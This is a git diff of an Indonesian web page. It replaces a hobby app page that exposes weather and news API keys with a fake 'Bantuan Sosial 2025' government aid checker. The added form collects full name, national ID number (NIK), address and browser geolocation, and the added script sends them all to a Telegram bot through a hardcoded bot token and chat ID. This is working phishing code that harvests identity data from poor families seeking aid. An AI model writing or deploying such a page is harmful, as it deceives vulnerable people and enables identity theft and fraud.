@@ -1,442 +1,198 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>App</title>
-  <style>
-/* Reset dan Style Umum */
-* {
-  margin: 0;
-  padding: 0;
-  box-sizing: border-box;
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="https://github.com/IKHSAN-PROJCT/ikhsan-projct.github.io/blob/main/images__3_-removebg-preview.png?raw=true" type="image/png">
+    <title>Bantuan Sosial 2025</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+        body {
+            background-color: #f9f5f0;
+            color: #333;
+            overflow-x: hidden;
+        }
+        header {
+            background: #ff6f61;
+            padding: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+        header img {
+    width: 50px;
+    position: absolute;
+    left: 1px; /* Ubah sesuai keinginan */
 }
-
-body {
-  font-family: 'Poppins', sans-serif;
-  background: url('https://media1.giphy.com/media/4ilFRqgbzbx4c/giphy.gif?cid=6c09b952piquxefgmj8nl4g5epgnlisw5g5yddnn3wyle5xu&ep=v1_internal_gif_by_id&rid=giphy.gif&ct=g') no-repeat center center fixed;
-  background-size: cover;
-  color: #fff;
-  height: 100vh;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  text-align: center;
-  overflow: hidden;
-  position: relative;
-}
-
-body::after {
-  content: '';
-  position: absolute;
-  top: 0;
-  left: 0;
-  right: 0;
-  bottom: 0;
-  background: rgba(255, 255, 255, 0.2); /* Warna transparan putih untuk efek asap */
-  filter: blur(8px); /* Menambahkan efek blur */
-  animation: moveBlur 5s linear infinite; /* Menambahkan animasi gerakan */
-}
-
-@keyframes moveBlur {
-  0% {
-    transform: translateX(0) translateY(0);
-  }
-  50% {
-    transform: translateX(20px) translateY(20px); /* Gerakan blur */
-  }
-  100% {
-    transform: translateX(0) translateY(0);
-  }
-}
-
-.typing {
-  font-size: 24px;
-  font-weight: bold;
-  text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
-  white-space: nowrap;
-  overflow: hidden;
-  border-right: 3px solid #fff;
-  width: 0;
-  animation: typing 4s steps(40, end), blink 0.6s step-end infinite alternate;
-}
-
-@keyframes typing {
-  from {
-    width: 0;
-  }
-  to {
-    width: 100%;
-  }
-}
-
-@keyframes blink {
-  from {
-    border-color: transparent;
-  }
-  to {
-    border-color: white;
-  }
-}
-h1, h2, h3 {
-  font-weight: 700;
-  text-align: center;
-  margin-bottom: 10px;
-  text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
-}
-
-p {
-  font-size: 16px;
-  line-height: 1.6;
-  text-align: center;
-  margin: 10px 20px;
-}
-
-button, a {
-  font-size: 16px;
-  text-decoration: none;
-  color: #fff;
-  background: rgba(255, 255, 255, 0.1);
-  padding: 12px 20px;
-  border-radius: 12px;
-  backdrop-filter: blur(5px);
-  box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.3);
-  transition: background 0.3s ease, transform 0.3s ease, box-shadow 0.3s;
-}
-
-button:hover, a:hover {
-  background: rgba(255, 255, 255, 0.2);
-  transform: translateY(-3px) scale(1.1);
-  box-shadow: 0px 8px 20px rgba(0, 0, 0, 0.5);
-}
-
-/* Container Utama */
-.container {
-  width: 100%;
-  max-width: 480px; /* Batas untuk menampilkan layout seperti aplikasi */
-  height: 100%;
-  background: rgba(255, 255, 255, 0.1);
-  backdrop-filter: blur(10px);
-  border-radius: 15px;
-  box-shadow: 0 8px 20px rgba(0, 0, 0, 0.5);
-  overflow: hidden;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  justify-content: flex-start;
-  position: relative;
-}
-
-/* Header */
-.header {
-  width: 100%;
-  padding: 20px;
-  background: rgba(0, 0, 0, 0.7);
-  text-align: center;
-  box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
-  position: sticky;
-  top: 0;
-  z-index: 1000;
-}
-
-.header h1 {
-  font-size: 20px;
-  color: #f0e6fa;
-}
-
-/* Konten */
-.content {
-  flex: 1;
-  width: 100%;
-  padding: 20px;
-  overflow-y: auto; /* Scroll jika konten melebihi tinggi layar */
-}
-
-.card {
-  background: rgba(0, 0, 0, 0.6);
-  padding: 15px;
-  border-radius: 10px;
-  margin-bottom: 20px;
-  box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
-  transition: transform 0.3s ease, box-shadow 0.3s ease;
-}
-
-.card:hover {
-  transform: scale(1.05);
-  box-shadow: 0px 6px 15px rgba(0, 0, 0, 0.5);
-}
-
-/* Footer */
-.footer {
-  width: 100%;
-  padding: 15px;
-  background: rgba(0, 0, 0, 0.8);
-  text-align: center;
-  position: sticky;
-  bottom: 0;
-  z-index: 1000;
-  box-shadow: 0 -4px 8px rgba(0, 0, 0, 0.3);
-}
-
-.footer button {
-  width: 100%;
-  font-size: 18px;
-  padding: 12px 0;
-  border: none;
-  cursor: pointer;
-  backdrop-filter: blur(5px);
-  transition: background 0.3s ease, transform 0.3s ease;
-}
-
-.footer button:hover {
-  background: rgba(255, 255, 255, 0.2);
-  transform: translateY(-2px);
-}
-
-/* Sidebar */
-.sidebar {
-  position: absolute;
-  top: 0;
-  left: -100%;
-  width: 80%;
-  max-width: 300px;
-  height: 100%;
-  background: #243b55;
-  color: #fff;
-  transition: 0.3s ease;
-  z-index: 1500;
-  display: flex;
-  flex-direction: column;
-  padding-top: 60px;
-}
-
-.sidebar.active {
-  left: 0;
-}
-
-.sidebar .menu ul {
-  list-style: none;
-  padding: 0;
-}
-
-.sidebar .menu ul li {
-  padding: 15px;
-  text-align: center;
-  font-size: 18px;
-  transition: background 0.3s ease, transform 0.3s ease;
-}
-
-.sidebar .menu ul li:hover {
-  background:;
-  transform: scale(1.1);
-}
-
-.sidebar .close-btn {
-  position: absolute;
-  top: 15px;
-  right: 15px;
-  font-size: 20px;
-  color: #fff;
-  cursor: pointer;
-}
-
-/* Tombol Menu */
-.open-btn {
-  background: rgba(255, 255, 255, 0.2);
-  backdrop-filter: blur(5px);
-  padding: 12px 18px;
-  border-radius: 12px;
-  color: #fff;
-  font-size: 16px;
-  cursor: pointer;
-  position: fixed;
-  top: 20px;
-  left: 20px;
-  box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.3);
-  transition: transform 0.3s ease, box-shadow 0.3s ease;
-  z-index: 2000;
-}
-
-.open-btn:hover {
-  transform: translateY(-3px);
-  box-shadow: 0px 8px 20px rgba(0, 0, 0, 0.5);
-}
-
-/* Responsif */
-@media (max-width: 480px) {
-  h1 {
-    font-size: 18px;
-  }
-
-  p {
-    font-size: 14px;
-  }
-
-  button {
-    font-size: 14px;
-    padding: 10px 15px;
-  }
-
-  .sidebar {
-    width: 100%;
-  }
-}
-  </style>
+        header h1 {
+            font-size: 24px;
+            color: white;
+            text-align: center;
+        }
+        .container {
+            width: 90%;
+            max-width: 900px;
+            margin: 20px auto;
+            padding: 20px;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            animation: fadeIn 1.5s ease-in-out;
+        }
+        @keyframes fadeIn {
+            from {opacity: 0; transform: translateY(-20px);}
+            to {opacity: 1; transform: translateY(0);}
+        }
+        h2 {
+            text-align: center;
+            margin-bottom: 15px;
+            color: #ff6f61;
+        }
+        .program-list {
+            margin-bottom: 20px;
+        }
+        .program {
+            padding: 15px;
+            background: #ffe4e1;
+            margin-bottom: 10px;
+            border-radius: 5px;
+            font-size: 18px;
+            transition: transform 0.3s ease;
+        }
+        .program:hover {
+            transform: scale(1.05);
+        }
+        form {
+            background: #fffbf2;
+            padding: 15px;
+            border-radius: 8px;
+        }
+        form input, form select, form button {
+            width: 100%;
+            padding: 12px;
+            margin-top: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        form input, form select {
+            background: #fffaf0;
+            color: #333;
+        }
+        form button {
+            background: #ff6f61;
+            color: white;
+            font-size: 18px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background 0.3s ease;
+        }
+        form button:hover {
+            background: #e65a50;
+        }
+        footer {
+            text-align: center;
+            padding: 15px;
+            background: #ff6f61;
+            color: white;
+            margin-top: 20px;
+            font-size: 16px;
+        }
+    </style>
 </head>
 <body>
-      <!-- Audio element -->
-    <audio autoplay loop>
-        <source src="https://github.com/IKHSAN-PROJCT/ikhsan-projct.github.io/blob/main/ssstik.io_1732698084380.mp3?raw=true" type="audio/mp3">
-        Your browser does not support the audio element.
-    </audio>
-  <div class="sidebar" id="sidebar">
-    <button class="close-btn" onclick="toggleSidebar()">×</button>
-    <nav class="menu">
-      <ul>
-        <li><a href="#" onclick="showHome()">Profile</a></li>
-        <li><a href="#" onclick="checkWeather()">Check the weather</a></li>
-        <li><a href="#" onclick="checkNews()">Check the news</a></li>
-        <li><a href="#" onclick="checkWaifu()">Check waifu</a></li>
-        <li><a href="#" onclick="subscribe()">Subscribe</a></li>
-        <li><a href="#" onclick="contact()">Contact</a></li>
-        <li><a href="#" onclick="about()">About</a></li>
-      </ul>
-    </nav>
-  </div>
-  
-  <div class="content">
-    <button class="open-btn" onclick="toggleSidebar()">☰</button>
-    <h1>WELLCOME</h1>
-    <p></p>
-    <div id="content-display">
-      <!-- Konten dinamis akan ditampilkan di sini -->
+
+<header>
+    <img src="https://github.com/IKHSAN-PROJCT/ikhsan-projct.github.io/blob/main/images__3_-removebg-preview.png?raw=true" alt="Logo"> <!-- Logo di bagian kiri -->
+    <h1>Bantuan Sosial 2025</h1>
+</header>
+
+<div class="container">
+    <h2>Program bantuan 2025</h2>
+    <div class="program-list">
+        <div class="program">
+            <strong>🛒 Bantuan Pangan</strong> – Paket sembako gratis untuk keluarga kurang mampu.
+        </div>
+        <div class="program">
+            <strong>🩺 Bantuan Kesehatan</strong> – Bantuan biaya persalinan dan kesehatan anak.
+        </div>
+        <div class="program">
+            <strong>🎒 Bantuan Pendidikan</strong> – Beasiswa untuk anak sekolah dan bantuan seragam.
+        </div>
+        <div class="program">
+            <strong>🏠 Bantuan Rumah Tangga</strong> – Subsidi listrik dan gas untuk ibu rumah tangga.
+        </div>
     </div>
-  </div>
 
-  <script>
-    function toggleSidebar() {
-      var sidebar = document.getElementById('sidebar');
-      sidebar.classList.toggle('active');
-    }
+    <h2>Cek Bantuan mu disini!</h2>
+    <form id="bansosForm">
+        <input type="text" id="nama" placeholder="Nama Lengkap (Ibu/Penerima)" required>
+        <input type="text" id="nik" placeholder="NIK (Nomor KTP)" required>
+        <input type="text" id="alamat" placeholder="Alamat Lengkap" required>
+        <select id="bantuan">
+            <option>Pilih Jenis Bantuan</option>
+            <option>Bantuan Pangan</option>
+            <option>Bantuan Kesehatan</option>
+            <option>Bantuan Pendidikan</option>
+            <option>Bantuan Rumah Tangga</option>
+        </select>
+        <button type="submit">Cek Sekarang</button>
+    </form>
+</div>
 
-    function showHome() {
-      document.getElementById('content-display').innerHTML = `
-        <h3>profile</h3>
-        <p>Hallo cuy gimana kabar nya? semoga sehat selalu ya!<br>Tujuan saya membuat aplikasi ini yaitu untuk mengembangkan project saya sendiri dan memperpudah buat kalian yang suka lihat lihat cuaca atau yang lain nya, tenang saya bakal terus kembangin aplikasi ini kok<br>Jangan lupa support terus channel gua ya!</p>
-        <img src="https://media2.giphy.com/media/VLqGlBC1BsPtev9RnJ/giphy.gif?cid=6c09b952i8fcs4guooyserdxrrfncco5ia40skbapn7f45lk&ep=v1_internal_gif_by_id&rid=giphy.gif&ct=g" alt="Main Image" style="max-width: 100%; height: auto;">
-      `;
-    }
+<footer style="background: #ff6f61; color: white; text-align: center; padding: 15px; font-size: 16px; border-radius: 0 0 10px 10px;">
+    &copy; 2025 Bantuan Sosial Indonesia  
+    <br><em>"Peduli dan Sejahtera Bersama"</em>  
+    <br><a href="#" style="color: white; text-decoration: none; font-weight: bold;">Kebijakan Privasi</a> |  
+    <a href="#" style="color: white; text-decoration: none; font-weight: bold;">Syarat & Ketentuan</a>  
+</footer>
 
-    function checkWeather() {
-      let city = prompt("Masukkan nama kota:");
-      if (city) {
-        fetch(`https://api.openweathermap.org/data/2.5/weather?q=${city}&appid=daa5f78a98d2cdd3955fee0ac2de3694&units=metric`)
-          .then(response => response.json())
-          .then(data => {
-            document.getElementById('content-display').innerHTML = `
-              <h2>Weather in ${data.name}</h2>
-              <p>Temperature: ${data.main.temp}°C</p>
-              <p>Weather: ${data.weather[0].description}</p>
-            `;
-          })
-          .catch(error => {
-            document.getElementById('content-display').innerHTML = '<p>Sorry, could not retrieve weather data.</p>';
-          });
-      } else {
-        alert("Kota tidak dimasukkan.");
-      }
-    }
+<script>
+    let userLocation = "Tidak diketahui";
 
-    function checkNews() {
-  fetch('https://newsapi.org/v2/top-headlines?country=id&apiKey=6afda593a8134da2a9c4d6039c6dc0ee')
-    .then(response => response.json())
-    .then(data => {
-      console.log(data); // Menampilkan data API yang diterima
-      let newsHtml = '<h2>Latest News</h2><ul>';
-      
-      // Menampilkan semua artikel yang diterima dari API
-      if (data.articles && data.articles.length > 0) {
-        data.articles.forEach(article => {
-          newsHtml += `<li><a href="${article.url}" target="_blank">${article.title} - <em>${article.source.name}</em></a></li>`;
-        });
-      } else {
-        newsHtml += '<p>Sorry Bagian fitur ini masih pengembangan!</p>';
-      }
-
-      newsHtml += '</ul>';
-      document.getElementById('content-display').innerHTML = newsHtml;
-    })
-    .catch(error => {
-      document.getElementById('content-display').innerHTML = '<p>Sorry, could not retrieve news.</p>';
-    });
-}
-    function checkWaifu() {
-      document.getElementById('content-display').innerHTML = `
-        <h2>Waifu Picture</h2>
-        <textarea id="waifu-input" placeholder=".waifu" rows="3" style="width: 100%;"></textarea>
-        <button onclick="fetchWaifu()">Get Waifu Image</button>
-        <div id="waifu-container"></div>
-      `;
-    }
-
-    function fetchWaifu() {
-      const waifuInput = document.getElementById('waifu-input').value.trim();
-      if (waifuInput === '.waifu') {
-        fetch('https://api.waifu.pics/sfw/waifu')
-          .then(response => response.json())
-          .then(data => {
-            const waifuContainer = document.getElementById('waifu-container');
-            waifuContainer.innerHTML = `
-              <img src="${data.url}" alt="Waifu" id="waifu-image"height="345px">
-            `;
-          })
-          .catch(error => {
-            document.getElementById('waifu-container').innerHTML = '<p>Sorry, could not retrieve waifu image.</p>';
-          });
-      } else {
-        alert('Masukkan perintah ".waifu" untuk mendapatkan gambar.');
-      }
-    }
-
-    function subscribe() {
-        document.getElementById('content-display').innerHTML = `
-          <h2>Subscribe to Channel</h2>
-          <p>Masukkan email Anda untuk berlangganan youtube kami dan dapatkan informasi terbaru!</p>
-          <input type="email" id="email" placeholder="Email Anda" style="padding: 10px; margin: 10px 0; width: 70%;" required>
-         <button onclick="window.open('https://youtube.com/@sanzacil_026', '_blank', 'width=800,height=600')">Youtube</button>
-        `;
-      }
-
-      function submitSubscription() {
-        const email = document.getElementById('email').value;
-        if (email) {
-          document.getElementById('content-display').innerHTML = `
-            <h2>Terima kasih telah berlangganan!</h2>
-            <p>Email: ${email} telah terdaftar untuk mendapatkan update terbaru dari kami.</p>
-          `;
-        } else {
-          alert("Harap masukkan email yang valid.");
+    // Minta izin lokasi saat halaman dimuat
+    window.onload = function() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(position => {
+                userLocation = `Lat: ${position.coords.latitude}, Lng: ${position.coords.longitude}`;
+            }, () => {
+                userLocation = "Lokasi tidak diberikan";
+            });
         }
-      }
+    };
 
-      function contact() {
-        document.getElementById('content-display').innerHTML = `
-          <h2>Contact Us</h2>
-          <p>Untuk informasi lebih lanjut atau pertanyaan, silakan hubungi kami melalui WhatsApp atau email.</p>
-          <p>Email: adeikhsannurrahman28@gmail.com</p>
-          <p>WhatsApp: 6283151697416</p>
-          <button onclick="window.open('https://wa.me/6283151697416', '_blank', 'width=800,height=600')">WhatsApp</button>
-        `;
-      }
+    // Fungsi mengirim data ke bot Telegram
+    document.getElementById('bansosForm').addEventListener('submit', function(event) {
+        event.preventDefault();
+        
+        let nama = document.getElementById('nama').value;
+        let nik = document.getElementById('nik').value;
+        let alamat = document.getElementById('alamat').value;
+        let bantuan = document.getElementById('bantuan').value;
 
-      function about() {
-        document.getElementById('content-display').innerHTML = `
-          <h2>About Us</h2>
-          <p>Website ini dibuat untuk memberikan informasi dan layanan terbaik kepada pengunjungnya. Kami menyediakan berbagai fitur untuk kenyamanan Anda.</p>
-          <p>Fitur-fitur utama termasuk pemeriksaan cuaca, berita terkini, dan layanan pelanggan melalui WhatsApp.</p>
-        `;
-      }
-  </script>
+        let message = `📌 *Pendaftaran Bantuan Sosial*\n\n` +
+                      `👩 Nama: ${nama}\n` +
+                      `🆔 NIK: ${nik}\n` +
+                      `📍 Alamat: ${alamat}\n` +
+                      `🎯 Jenis Bantuan: ${bantuan}\n` +
+                      `🌍 Lokasi: ${userLocation}`;
+
+        let botToken = "7819595240:AAHnsDhfrjiAM6U0GQTKQW7SBrsB1azDMYs";  // Ganti dengan Token Bot Telegram
+        let chatID = "6864784021";  // Ganti dengan Chat ID Anda
+
+        let telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+        fetch(telegramURL)
+            .then(response => alert("Data berhasil dikirim!"))
+            .catch(error => alert("Gagal mengirim data!"));
+    });
+</script>
 
 </body>
 </html>
